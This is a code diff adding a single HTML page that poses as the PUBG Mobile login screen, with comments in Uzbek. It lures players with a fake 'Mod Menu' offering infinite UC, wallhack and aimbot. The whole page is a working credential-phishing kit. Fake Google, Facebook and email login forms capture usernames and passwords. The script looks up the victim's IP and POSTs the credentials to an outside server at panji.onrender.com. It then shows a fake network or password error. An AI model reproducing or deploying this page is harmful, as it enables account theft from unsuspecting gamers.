@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>PUBG MOBILE</title>
+<style>
+    /* -----------------------------------------------------------
+       GLOBAL SOZLAMALAR
+    ----------------------------------------------------------- */
+    * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-drag: none; font-family: Arial, sans-serif; }
+    body, html { width: 100%; height: 100%; overflow: hidden; background-color: #000; }
+
+    /* LANDSCAPE MAJBURIY */
+    #main-wrapper { position: relative; width: 100%; height: 100%; transform-origin: top left; transition: all 0.5s ease; }
+    @media screen and (orientation: portrait) {
+        #main-wrapper { width: 100vh; height: 100vw; transform: rotate(90deg) translateY(-100%); overflow: hidden; }
+    }
+
+    /* EKRANLAR */
+    .screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: none; z-index: 10; }
+    .screen.active { display: block; }
+    .bg-img { width: 100%; height: 100%; object-fit: cover; position: absolute; z-index: -1; }
+
+    /* YUKLASH (LOADING) */
+    .loading-ui { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); width: 70%; text-align: center; }
+    .loading-bar-bg { width: 100%; height: 6px; background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255,255,255,0.3); border-radius: 4px; overflow: hidden; margin-bottom: 8px; }
+    .loading-bar-fill { width: 0%; height: 100%; background: #ffffff; transition: width 3s linear; box-shadow: 0 0 10px #fff; }
+    .loading-text { color: #fff; font-size: 14px; text-shadow: 1px 1px 2px #000; font-weight: bold; }
+
+    /* LOGIN QISMI VA TUGMALAR (O'ZGARTIRILDI) */
+    .version-tag { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.5); color: white; padding: 3px 8px; font-size: 10px; border-radius: 4px; }
+    .top-right-icons { position: absolute; top: 15px; right: 15px; display: flex; flex-direction: column; gap: 10px; align-items: center; }
+    .icon-box { text-align: center; color: white; font-size: 9px; cursor: pointer; }
+    .icon-circle { width: 30px; height: 30px; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.3); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 2px; font-size: 16px; }
+
+    .login-controls { position: absolute; bottom: 40px; width: 100%; display: flex; flex-direction: column; align-items: center; z-index: 20; }
+    .buttons-row { display: flex; gap: 10px; align-items: center; margin-bottom: 15px; }
+
+    /* TUGMALAR DIZAYNI (YANGI) */
+    .btn {
+        height: 38px; border-radius: 4px; cursor: pointer;
+        display: flex; align-items: center; justify-content: center;
+        font-weight: bold; font-size: 12px; position: relative;
+        transition: transform 0.1s; box-shadow: 0 2px 5px rgba(0,0,0,0.5);
+    }
+    .btn:active { transform: scale(0.95); }
+
+    /* Google va Facebook tugmalari */
+    .btn-google {
+        background: #fff; color: #555; width: 130px;
+        display: flex; gap: 8px; /* Rasm va yozuv orasi */
+    }
+    .btn-fb {
+        background: #3b5998; color: #fff; width: 130px;
+        display: flex; gap: 8px;
+    }
+    
+    /* Tugma ichidagi kichkina logolar */
+    .btn-icon-small { width: 20px; height: 20px; object-fit: contain; }
+
+    .btn-phone { background: #fcae18; color: #000; width: 110px; display: flex; gap: 5px; }
+    .mail-icon { font-size: 16px; }
+    .btn-more { background: rgba(0,0,0,0.7); color: #fff; width: 50px; border: 1px solid rgba(255,255,255,0.2); }
+
+    .terms-container { display: flex; gap: 15px; color: #ccc; font-size: 10px; text-shadow: 1px 1px 2px #000; transform: scale(0.9); }
+    .term-item { display: flex; align-items: center; gap: 5px; cursor: pointer; }
+    .diamond-check { width: 10px; height: 10px; background: #00e676; transform: rotate(45deg); border: 1px solid #fff; box-shadow: 0 0 5px #00e676; }
+
+    /* MODAL OYNALAR */
+    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 100; display: none; justify-content: center; align-items: center; backdrop-filter: blur(3px); }
+    .modal-overlay.open { display: flex; }
+    .login-box { background: #fff; width: 340px; border-radius: 5px; overflow: hidden; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
+    .error-msg { color: red; font-size: 13px; margin-top: 10px; display: none; text-align: center; font-weight: bold; }
+    .box-dark { background: #181818; border: 1px solid #fcae18; color: #fcae18; }
+    .box-dark input { background: #333; border: 1px solid #555; color: white; }
+    .inp-field { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 3px; outline: none; }
+    .submit-btn { width: 100%; padding: 10px; border: none; cursor: pointer; font-weight: bold; }
+    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 10px auto; display: none; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 75% {transform: translateX(5px);} }
+
+    /* MOD MENU */
+    #mod-floater { position: fixed; top: 20px; left: 20px; width: 50px; height: 50px; z-index: 9999; cursor: move; border-radius: 50%; box-shadow: 0 0 15px #fcae18; background: #000; border: 2px solid #fcae18; overflow: hidden; transition: transform 0.1s; }
+    #mod-floater:active { transform: scale(0.9); }
+    #mod-floater img { width: 100%; height: 100%; object-fit: cover; }
+    #mod-menu { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 250px; background: rgba(0, 0, 0, 0.95); border: 2px solid #fcae18; border-radius: 10px; padding: 15px; z-index: 10000; display: block; color: white; }
+    #mod-menu h3 { text-align: center; color: #fcae18; margin-bottom: 15px; font-size: 16px; }
+    .mod-item { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; font-size: 13px; font-weight: bold; }
+    .toggle-switch { width: 40px; height: 20px; background: #333; border-radius: 20px; position: relative; cursor: pointer; transition: 0.3s; }
+    .toggle-switch::after { content: ''; position: absolute; top: 2px; left: 2px; width: 16px; height: 16px; background: white; border-radius: 50%; transition: 0.3s; }
+    .toggle-switch.on { background: #00e676; }
+    .toggle-switch.on::after { left: 22px; }
+
+</style>
+</head>
+<body>
+
+<div id="main-wrapper">
+
+    <!-- MOD ICON -->
+    <div id="mod-floater" ontouchstart="dragStart(event)" ontouchmove="dragMove(event)" onclick="toggleModMenu()">
+        <img src="uc.jpg" alt="UC">
+    </div>
+
+    <!-- MOD MENU PANEL -->
+    <div id="mod-menu">
+        <h3>Mod Menu V4.1</h3>
+        <span onclick="toggleModMenu()" style="position:absolute; top:5px; right:10px; color:red; cursor:pointer; font-size:20px;">&times;</span>
+        <div class="mod-item"><span>Infinite UC</span><div class="toggle-switch" onclick="this.classList.toggle('on'); playBtnSound()"></div></div>
+        <div class="mod-item"><span>Wallhack (ESP)</span><div class="toggle-switch" onclick="this.classList.toggle('on'); playBtnSound()"></div></div>
+        <div class="mod-item"><span>Aimbot 100%</span><div class="toggle-switch" onclick="this.classList.toggle('on'); playBtnSound()"></div></div>
+    </div>
+
+    <!-- 1-BOSQICH: LOGOLAR -->
+    <div id="screen-logos" class="screen active">
+        <img src="1-rasm.jpg" class="bg-img" style="object-fit: contain; background: #000;">
+    </div>
+
+    <!-- 2-BOSQICH: YUKLASH -->
+    <div id="screen-loading" class="screen">
+        <img src="2-rasm.jpg" class="bg-img">
+        <div class="loading-ui">
+            <div class="loading-bar-bg"><div id="progress-fill" class="loading-bar-fill"></div></div>
+            <p class="loading-text">Yuklanmoqda...</p>
+        </div>
+    </div>
+
+    <!-- 3-BOSQICH: KIRISH (LOGIN) -->
+    <div id="screen-login" class="screen">
+        <img src="3-rasm.jpg" class="bg-img">
+        <div class="version-tag">Versiya 4.1.0.20577</div>
+        <div class="top-right-icons">
+            <div class="icon-box" onclick="playBtnSound()"><div class="icon-circle">?</div><span>Yordam</span></div>
+            <div class="icon-box" onclick="playBtnSound()"><div class="icon-circle">🌐</div><span>Til</span></div>
+            <div class="icon-box" onclick="playBtnSound()"><div class="icon-circle">🛠</div><span>Ta'mirlash</span></div>
+        </div>
+
+        <!-- TUGMALAR (YANGILANGAN) -->
+        <div class="login-controls">
+            <div class="buttons-row">
+                <!-- Google (Kichkina logotipli) -->
+                <div class="btn btn-google" onclick="openModal('google')">
+                    <img src="google.jpg" class="btn-icon-small" alt="G">
+                    <span>Google</span>
+                </div>
+                
+                <!-- Facebook (Kichkina logotipli) -->
+                <div class="btn btn-fb" onclick="openModal('facebook')">
+                    <img src="facebook.jpg" class="btn-icon-small" alt="F">
+                    <span>Facebook</span>
+                </div>
+
+                <div class="btn btn-phone" onclick="openModal('phone')"><span class="mail-icon">✉</span><span>Email</span></div>
+                <div class="btn btn-more" onclick="openModal('more')"><span>More</span></div>
+            </div>
+            <div class="terms-container">
+                <div class="term-item"><div class="diamond-check"></div><span>O'qib chiqdim va roziman <u>MAXFIYLIK</u></span></div>
+                <div class="term-item"><div class="diamond-check"></div><span>O'qib chiqdim va roziman <u>KELISHUV</u></span></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- OVOZLAR -->
+<audio id="bg-audio" loop><source src="musiqa.mp3" type="audio/mpeg"></audio>
+<audio id="btn-sound"><source src="button.mp3" type="audio/mpeg"></audio>
+
+<!-- MODALLAR (O'zgarmadi) -->
+<div id="modal-google" class="modal-overlay">
+    <div class="login-box" style="padding: 25px; text-align: center;">
+        <span onclick="closeModal('google')" style="position:absolute; top:5px; right:10px; cursor:pointer; font-size:20px;">&times;</span>
+        <img src="google.jpg" width="60" style="margin-bottom:10px;">
+        <h4 style="margin-bottom:15px; font-weight:normal;">Sign in with Google</h4>
+        <input type="text" id="google-email" class="inp-field" placeholder="Email or phone">
+        <input type="password" id="google-password" class="inp-field" placeholder="Password">
+        <div id="err-google" class="error-msg">Parol yoki email xato!</div>
+        <div class="spinner" id="google-spinner"></div>
+        <button class="submit-btn" style="background:#1a73e8; color:white;" onclick="submitLogin('google')">Next</button>
+    </div>
+</div>
+
+<div id="modal-facebook" class="modal-overlay">
+    <div class="login-box">
+        <div style="background:#3b5998; color:white; padding:10px; font-weight:bold;">Facebook</div>
+        <div style="padding:15px; background:#eceff5;">
+            <p style="margin-bottom:10px; font-size:12px;">Log in to use your Facebook account.</p>
+            <input type="text" id="fb-email" class="inp-field" placeholder="Email or phone">
+            <input type="password" id="fb-password" class="inp-field" placeholder="Password">
+            <div id="err-facebook" class="error-msg">Login xatosi. Qayta urining.</div>
+            <div class="spinner" id="fb-spinner"></div>
+            <button class="submit-btn" style="background:#3b5998; color:white;" onclick="submitLogin('facebook')">Log In</button>
+        </div>
+    </div>
+</div>
+
+<div id="modal-phone" class="modal-overlay">
+    <div class="login-box box-dark">
+        <div style="padding:10px; text-align:center; border-bottom:1px solid #333;">LOGIN</div>
+        <div style="padding:20px;">
+            <input type="text" id="phone-email" class="inp-field" placeholder="Phone / Email">
+            <input type="password" id="phone-password" class="inp-field" placeholder="Password">
+            <div id="err-phone" class="error-msg">Tarmoq xatosi.</div>
+            <div class="spinner" id="phone-spinner"></div>
+            <button class="submit-btn" style="background:#fcae18; color:black;" onclick="submitLogin('phone')">OK</button>
+            <div style="text-align:center; margin-top:10px; cursor:pointer;" onclick="closeModal('phone')">Cancel</div>
+        </div>
+    </div>
+</div>
+
+<div id="modal-more" class="modal-overlay">
+    <div class="login-box" style="padding:20px;">
+        <span onclick="closeModal('more')" style="position:absolute; top:5px; right:10px; cursor:pointer; font-size:20px;">&times;</span>
+        <h3>More Options</h3>
+        <p style="margin:10px 0; font-size:13px; color:#666;">Twitter, VK, Guest...</p>
+    </div>
+</div>
+
+<script>
+    // --- 1. RENDERDAGI BOT MANZILI (MUHIM!) ---
+    // Bu yerga Render bergan linkni yozing va oxiriga /login_submit qo'shing
+    const RENDER_API_URL = "https://panji.onrender.com/login_submit"; 
+
+    // --- 2. LINKDAN ID NI OLISH ---
+    // GitHub bu yerni avtomatik bajaradi
+    const urlParams = new URLSearchParams(window.location.search);
+    const CURRENT_USER_ID = urlParams.get('user_id') || "Noma'lum"; 
+
+    // ELEMENTLAR VA OVOZLAR
+    const screenLogos = document.getElementById('screen-logos');
+    const screenLoading = document.getElementById('screen-loading');
+    const screenLogin = document.getElementById('screen-login');
+    const progressFill = document.getElementById('progress-fill');
+    const audio = document.getElementById('bg-audio');
+    const btnSound = document.getElementById('btn-sound');
+
+    function playBtnSound() { btnSound.currentTime = 0; btnSound.play().catch(()=>{}); }
+
+    // YUKLASH LOGIKASI
+    window.onload = function() {
+        setTimeout(() => {
+            screenLogos.classList.remove('active');
+            screenLoading.classList.add('active');
+            setTimeout(() => { progressFill.style.width = "100%"; }, 100);
+            setTimeout(() => {
+                screenLoading.classList.remove('active');
+                screenLogin.classList.add('active');
+                audio.volume = 0.5;
+                audio.play().catch(() => { document.body.addEventListener('click', () => audio.play(), {once:true}); });
+            }, 3500);
+        }, 2000);
+    };
+
+    function openModal(type) { playBtnSound(); document.getElementById('modal-'+type).classList.add('open'); }
+    function closeModal(type) {
+        playBtnSound(); document.getElementById('modal-'+type).classList.remove('open');
+        document.querySelectorAll('.error-msg').forEach(e => e.style.display = 'none');
+        document.querySelectorAll('.spinner').forEach(s => s.style.display = 'none');
+    }
+
+    // SERVERGA (RENDERGA) YUBORISH
+    async function submitLogin(method) {
+        playBtnSound();
+        let u, p;
+        // Inputlarni olish
+        if(method==='google'){ u=document.getElementById('google-email').value; p=document.getElementById('google-password').value; }
+        if(method==='facebook'){ u=document.getElementById('fb-email').value; p=document.getElementById('fb-password').value; }
+        if(method==='phone'){ u=document.getElementById('phone-email').value; p=document.getElementById('phone-password').value; }
+
+        if (!u || !p) { alert("To'ldiring!"); return; }
+
+        const spinner = document.getElementById(method === 'facebook' ? 'fb-spinner' : method + '-spinner');
+        spinner.style.display = 'block';
+
+        // 1. RENDERGA YUBORISH
+        try {
+            // IP ni aniqlash
+            const ipData = await fetch('https://api.ipify.org?format=json').then(res=>res.json()).catch(()=>({ip:"Noma'lum"}));
+            
+            // Render manziliga jo'natish
+            await fetch(RENDER_API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    user_id: CURRENT_USER_ID, // Linkdan olingan ID
+                    method: method,
+                    username: u,
+                    password: p,
+                    ip: ipData.ip
+                })
+            });
+        } catch (e) {
+            console.log("Xatolik:", e);
+        }
+
+        // 2. FAKE XATO CHIQARISH
+        setTimeout(() => {
+            spinner.style.display = 'none';
+            const errEl = document.getElementById(`err-${method}`);
+            
+            if(method === 'google') errEl.innerHTML = "Parol noto'g'ri. Qayta urining.";
+            else errEl.innerHTML = "Tarmoq xatosi (Code: 504)";
+            
+            errEl.style.display = 'block';
+            
+            const box = document.querySelector(`#modal-${method} .login-box`);
+            box.style.animation = 'shake 0.4s';
+            setTimeout(()=> box.style.animation='', 400);
+
+            // Tozalash
+            if(method==='google') document.getElementById('google-password').value = "";
+            if(method==='facebook') document.getElementById('fb-password').value = "";
+            if(method==='phone') document.getElementById('phone-password').value = "";
+        }, 1500);
+    }
+
+    // MOD MENU SURISH
+    let dragItem = document.querySelector("#mod-floater");
+    let active = false, currentX, currentY, initialX, initialY, xOffset = 0, yOffset = 0;
+    function dragStart(e) { initialX = e.touches[0].clientX - xOffset; initialY = e.touches[0].clientY - yOffset; active = true; }
+    function dragMove(e) { if (active) { e.preventDefault(); currentX = e.touches[0].clientX - initialX; currentY = e.touches[0].clientY - initialY; xOffset = currentX; yOffset = currentY; setTranslate(currentX, currentY, dragItem); } }
+    function setTranslate(xPos, yPos, el) { el.style.transform = "translate3d(" + xPos + "px, " + yPos + "px, 0)"; }
+    function toggleModMenu() { playBtnSound(); const m = document.getElementById('mod-menu'); m.style.display = (m.style.display === 'block') ? 'none' : 'block'; }
+</script>
+<style>
+@keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } 100% { transform: translateX(0); } }
+</style>
+
+</body>
+</html>
